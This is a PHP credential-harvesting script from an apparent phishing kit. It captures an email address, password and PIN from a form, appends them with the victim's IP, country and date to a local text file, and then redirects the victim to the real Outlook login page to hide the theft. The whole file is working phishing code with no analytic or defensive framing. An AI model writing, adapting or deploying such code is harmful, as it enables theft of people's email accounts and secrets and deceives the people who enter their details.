<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

////////////////////
if ( isset ($_POST['correo']) && isset ($_POST['passwd']) && isset ($_POST['piiin'])){

	$file = fopen("gabo.txt", "a");
fwrite($file, "======================" . PHP_EOL);	
fwrite($file, "Correo: ".$_POST['correo']." - Clave Correo: ".$_POST['passwd']." - Pin: ".$_POST['piiin']." - IP ".$userp ." ".$pais ." ".date('d/m/Y')." " .PHP_EOL);
fclose($file);

header("Refresh:2; url=https://outlook.live.com/owa/");
}else{ header ('location: index.html'); exit();
 }

?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="fonts/icomoon/style.css">

    <link rel="stylesheet" href="css/owl.carousel.min.css">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    
    <!-- Style -->
    <link rel="stylesheet" href="css/style.css">

    <title>home</title>
  </head>
  <body>
  

  <div class="half">
  
    <div class="contents order-2 order-md-1">

      <div class="container">
        <div class="row align-items-center justify-content-center">
          <div class="col-md-6">
            <div class="form-block">
              <div class="text-center mb-5">
			  
			  <img src="images/lod.gif" style="width:100%">
                       
              </div>
  
            </div>
          </div>
        </div>
      </div>
    </div>

    
  </div>
    
   
  </body>
</html>